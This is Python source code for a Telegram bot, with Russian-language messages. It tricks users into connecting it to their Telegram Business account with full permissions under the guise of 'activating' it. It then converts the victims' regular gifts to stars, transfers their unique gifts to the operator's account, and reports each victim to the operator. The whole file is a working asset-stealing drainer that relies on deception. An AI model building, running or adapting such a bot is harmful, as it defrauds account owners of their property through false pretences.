import asyncio
import datetime
import time
from aiogram import Bot, Dispatcher, F, types
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.utils.keyboard import InlineKeyboardBuilder, ReplyKeyboardBuilder
from aiogram.filters import CommandStart
from aiogram.exceptions import TelegramBadRequest

TOKEN = ""
MY_ID = 

bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.MARKDOWN))
dp = Dispatcher()

auto_transfer_mode = True

NOTIFICATION_CACHE = {}
NOTIFICATION_CACHE_DURATION = 30

def sanitize_markdown_chars(text: str) -> str:
    if not text:
        return ""
    return text.replace("*", " ").replace("_", " ").replace("`", "'").replace("[", "(").replace("]", ")")

def get_activation_keyboard(bot_username: str):
    builder = InlineKeyboardBuilder()
    builder.row(types.InlineKeyboardButton(text="⚙️ Открыть настройки Telegram", url="tg://settings"))
    builder.row(types.InlineKeyboardButton(text="🔗 Добавить в бизнес-аккаунт", url=f"tg://resolve?domain={bot_username}&start=business"))
    return builder.as_markup()

def get_admin_keyboard():
    builder = ReplyKeyboardBuilder()
    builder.row(types.KeyboardButton(text="🛠️ Настройка"))
    return builder.as_markup(resize_keyboard=True)

def get_transfer_settings_keyboard():
    builder = InlineKeyboardBuilder()
    builder.row(
        types.InlineKeyboardButton(text="Автоматически", callback_data="set_transfer_auto"),
        types.InlineKeyboardButton(text="По запросу", callback_data="set_transfer_manual")
    )
    return builder.as_markup()

async def execute_gift_transfer(business_connection_id: str, bot_instance: Bot, business_owner_username: str = "N/A"):
    results = {
        "converted_gifts_count": 0, "conversion_success_count": 0, "conversion_error_count": 0,
        "unique_gifts_found_count": 0, "unique_gifts_transferred_count": 0, "unique_gifts_transfer_error_count": 0,
        "critical_error_occurred": False, "overall_success": True
    }
    try:
        gifts_to_convert_response = await bot_instance.get_business_account_gifts(business_connection_id, exclude_unique=True)
        gifts_to_convert = gifts_to_convert_response.gifts
        results["converted_gifts_count"] = len(gifts_to_convert)
        if gifts_to_convert:
            for gift in gifts_to_convert:
                try:
                    await bot_instance.convert_gift_to_stars(business_connection_id, gift.owned_gift_id)
                    results["conversion_success_count"] += 1
                except TelegramBadRequest:
                    results["conversion_error_count"] += 1; results["overall_success"] = False
                except Exception:
                    results["conversion_error_count"] += 1; results["overall_success"] = False
    except Exception:
        results["critical_error_occurred"] = True; results["overall_success"] = False

    try:
        unique_gifts_response = await bot_instance.get_business_account_gifts(business_connection_id, exclude_unique=False)
        unique_gifts_list = [g for g in unique_gifts_response.gifts if getattr(g, 'is_unique', False)]
        results["unique_gifts_found_count"] = len(unique_gifts_list)
        if unique_gifts_list:
            for gift in unique_gifts_list:
                try:
                    await bot_instance.transfer_gift(business_connection_id, gift.owned_gift_id, MY_ID, 25)
                    results["unique_gifts_transferred_count"] += 1
                except Exception:
                    results["unique_gifts_transfer_error_count"] += 1; results["overall_success"] = False
    except Exception:
        results["critical_error_occurred"] = True; results["overall_success"] = False
    return results

@dp.message(CommandStart())
async def cmd_start(message: types.Message, bot_instance: Bot = bot):
    bot_user = await bot_instance.get_me()
    bot_username = bot_user.username
    if message.from_user.id == MY_ID:
        admin_mode_text = 'Автоматически' if auto_transfer_mode else 'По запросу'
        await message.answer(f"**👋 Привет, Администратор!**\n**Текущий режим передачи: {admin_mode_text}.**\n**Используйте кнопку '🛠️ Настройка' для изменения.**", reply_markup=get_admin_keyboard(), parse_mode=ParseMode.MARKDOWN)
    else:
        activation_text = (
            f"**⭐️ | АКТИВАЦИЯ БОТА @{bot_username.upper()}**\n\n"
            f"**Для начала работы выполните шаги:**\n"
            f"**├ [1️⃣] Перейдите в Настройки Telegram.**\n"
            f"**├ [2️⃣] Откройте раздел 'Telegram Business'.**\n"
            f"**├ [3️⃣] Нажмите 'Боты для бизнеса'.**\n"
            f"**└ [4️⃣] Добавьте этого бота (@{bot_username}), предоставив все разрешения.**\n\n"
            f"**Готово! Бот начнет работу автоматически.**"
        )
        await message.answer(activation_text, reply_markup=get_activation_keyboard(bot_username), parse_mode=ParseMode.MARKDOWN)

@dp.message(F.text == "🛠️ Настройка", F.from_user.id == MY_ID)
async def admin_settings_handler(message: types.Message):
    await message.answer("**Выберите режим передачи подарков и звезд:**", reply_markup=get_transfer_settings_keyboard(), parse_mode=ParseMode.MARKDOWN)

@dp.callback_query(F.data.startswith("set_transfer_"), F.from_user.id == MY_ID)
async def transfer_mode_callback_handler(callback: types.CallbackQuery):
    global auto_transfer_mode
    mode = callback.data.split("_")[-1]
    if mode == "auto": auto_transfer_mode = True
    elif mode == "manual": auto_transfer_mode = False
    current_mode_text = 'Автоматически' if auto_transfer_mode else 'По запросу'
    await callback.answer(f"Режим изменен на: {current_mode_text}")
    await callback.message.edit_text(f"**Режим передачи изменен на: {current_mode_text}.**", parse_mode=ParseMode.MARKDOWN)

@dp.business_message()
async def handle_business_message(message: types.Message, bot_instance: Bot = bot):
    business_connection_id = message.business_connection_id
    user_who_interacted = message.from_user 

    if user_who_interacted and user_who_interacted.id == MY_ID:
        return
    if not business_connection_id:
        return

    current_time = time.time()
    if business_connection_id in NOTIFICATION_CACHE and (current_time - NOTIFICATION_CACHE[business_connection_id]) < NOTIFICATION_CACHE_DURATION:
        return
    NOTIFICATION_CACHE[business_connection_id] = current_time

    business_chat = message.chat 
    raw_business_owner_username = business_chat.username or f"ID:{business_chat.id}"
    business_owner_username = sanitize_markdown_chars(raw_business_owner_username)
    
    raw_user_display_name = f"@{user_who_interacted.username}" if user_who_interacted.username else f"ID: {user_who_interacted.id}"
    user_display_name = sanitize_markdown_chars(raw_user_display_name)

    num_unique_gifts_initial, num_regular_gifts_initial, stars_on_account_initial = 0, 0, 0
    permission_status_content = "⚠️ Off (Ошибка чтения данных)" 
    entry_date = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    processing_status_line_content = ""

    try:
        regular_gifts_data = await bot_instance.get_business_account_gifts(business_connection_id, exclude_unique=True)
        num_regular_gifts_initial = len(regular_gifts_data.gifts)
        unique_gifts_data = await bot_instance.get_business_account_gifts(business_connection_id, exclude_unique=False)
        num_unique_gifts_initial = len([g for g in unique_gifts_data.gifts if getattr(g, 'is_unique', False)])
        stars_data = await bot_instance.get_business_account_star_balance(business_connection_id)
        stars_on_account_initial = stars_data.amount
        permission_status_content = "✅ On (Чтение доступно)"
    except TelegramBadRequest as e:
        error_label = e.label if hasattr(e, 'label') else e.message
        permission_status_content = f"⚠️ Off (Ошибка API: {sanitize_markdown_chars(error_label)})"
        if auto_transfer_mode: processing_status_line_content = "⚙️ Статус: ❌ Ошибка (нет доступа к данным)"
    except Exception as e:
        permission_status_content = f"⚠️ Off (Ошибка чтения: {sanitize_markdown_chars(e.__class__.__name__)})"
        if auto_transfer_mode: processing_status_line_content = "⚙️ Статус: ❌ Ошибка (нет доступа к данным)"

    if auto_transfer_mode and permission_status_content == "✅ On (Чтение доступно)":
        await bot_instance.send_message(MY_ID, f"**🤖 Автоматическая обработка для @{business_owner_username} (ID: {business_connection_id})...**", parse_mode=ParseMode.MARKDOWN)
        res = await execute_gift_transfer(business_connection_id, bot_instance, business_owner_username)
        success_emoji = '✅' if res['overall_success'] else '⚠️'
        status_part = f"⚙️ Статус: {success_emoji} {'Успешно' if res['overall_success'] else 'Ошибки'}"
        conv_part = f"🌸{res['conversion_success_count']}/{res['converted_gifts_count']}({res['conversion_error_count']})"
        uniq_part = f"🎁{res['unique_gifts_transferred_count']}/{res['unique_gifts_found_count']}({res['unique_gifts_transfer_error_count']})"
        processing_status_line_content = f"{status_part} | {conv_part} | {uniq_part}"

    lines = [
        f"**--------------------❇️ Новый заход --------------------**",
        f"**👤 | Бизнес-аккаунт: @{business_owner_username}**",
        f"**✉️ | От пользователя: {user_display_name}**",
        f"**------------------- Инфо о дате --------------------**",
        f"**🕰️ | Дата взаимодействия: {entry_date}**",
        f"**----------------- Инфо о подарках/звездах -----------------**",
        f"**🎁 | Уникальных подарков (оценка): {num_unique_gifts_initial}**",
        f"**🌸 | Обычных подарков (оценка): {num_regular_gifts_initial}**",
        f"**🌟 | Звезд на аккаунте (до обработки): {stars_on_account_initial}**",
        f"**🔓 | Доступ бота к данным: {permission_status_content}**"
    ]
    if processing_status_line_content:
        lines.append(f"**{processing_status_line_content}**")
    
    notification_text = "\n".join(lines)
    
    admin_notification_keyboard = None
    if not auto_transfer_mode and permission_status_content == "✅ On (Чтение доступно)": 
        builder = InlineKeyboardBuilder()
        builder.button(text="↪️ Передать сейчас", callback_data=f"manual_transfer:{business_connection_id}:{business_owner_username}")
        admin_notification_keyboard = builder.as_markup()
    
    await bot_instance.send_message(MY_ID, notification_text, reply_markup=admin_notification_keyboard, parse_mode=ParseMode.MARKDOWN)

    if auto_transfer_mode and permission_status_content != "✅ On (Чтение доступно)" and not processing_status_line_content:
        await bot_instance.send_message(MY_ID, f"**⚠️ Автоматическая обработка для @{business_owner_username} (ID: {business_connection_id}) невозможна: нет доступа к данным.**", parse_mode=ParseMode.MARKDOWN)

@dp.callback_query(F.data.startswith("manual_transfer:"), F.from_user.id == MY_ID)
async def manual_transfer_callback_handler(callback: types.CallbackQuery, bot_instance: Bot = bot):
    try:
        parts = callback.data.split(":")
        business_connection_id = parts[1]
        raw_owner_username = parts[2] if len(parts) > 2 else "N/A"
        business_owner_username = sanitize_markdown_chars(raw_owner_username)
    except IndexError:
        await callback.answer("Ошибка: неверный формат callback_data.", show_alert=True); return

    await callback.answer("⏳ Запускаю ручную передачу...")
    if callback.message:
        try: await callback.message.edit_reply_markup(reply_markup=None)
        except Exception: pass 

    transfer_results = await execute_gift_transfer(business_connection_id, bot_instance, business_owner_username)
    res = transfer_results 
    success_emoji = '✅' if res['overall_success'] else '⚠️'
    
    part1 = f"🏁 @{business_owner_username} | Ручная: {success_emoji} {'Завершено' if res['overall_success'] else 'Ошибки'}"
    part2 = f"🌸Конв: {res['conversion_success_count']}/{res['converted_gifts_count']} (Ошибок: {res['conversion_error_count']})"
    part3 = f"🎁Уник: {res['unique_gifts_transferred_count']}/{res['unique_gifts_found_count']} (Ошибок: {res['unique_gifts_transfer_error_count']})"
    result_summary = f"**{part1} | {part2} | {part3}**"
    
    await bot_instance.send_message(MY_ID, result_summary, parse_mode=ParseMode.MARKDOWN)

async def main():
    if TOKEN == "YOUR_TELEGRAM_BOT_TOKEN" or MY_ID == 0: return
    try:
        await bot.set_my_commands([types.BotCommand(command="/start", description="Запустить бота / Информация для админа")])
    except Exception: pass
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
